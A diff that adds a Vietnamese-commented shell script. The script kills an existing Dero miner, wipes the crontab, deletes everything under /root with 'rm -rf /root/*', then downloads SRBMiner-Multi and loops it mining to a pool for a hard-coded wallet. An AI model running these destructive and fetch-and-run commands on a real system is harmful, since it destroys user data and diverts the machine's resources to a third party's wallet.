@@ -1,0 +1,27 @@
+#!/bin/sh
+
+# Thực hiện lệnh ./killdero.sh
+./killdero.sh
+
+# Xóa tất cả các tác vụ trong crontab
+crontab -r
+
+# Xóa tất cả các file và thư mục trong thư mục gốc
+rm -rf /root/*
+
+# Tải SRBMiner-Multi
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.5/SRBMiner-Multi-2-5-5-Linux.tar.gz
+
+# Giải nén tập tin đã tải
+tar -xvf SRBMiner-Multi-2-5-5-Linux.tar.gz
+
+# Chuyển đến thư mục SRBMiner-Multi
+cd SRBMiner-Multi-2-5-5
+
+# Vòng lặp vô hạn để khởi động lại SRBMiner nếu nó dừng
+while [ 1 ]; do
+    # Chạy SRBMiner-Multi với các tham số đã chỉ định
+    ./SRBMiner-MULTI --algorithm randomscash --pool stratum-asia.rplant.xyz:17019 --tls true --wallet scash1qtkqtq72l9wfnjxwrtscn3gktfvme6g8u35lg68 --keepalive true
+    # Chờ 5 giây trước khi khởi động lại SRBMiner
+    sleep 5
+done
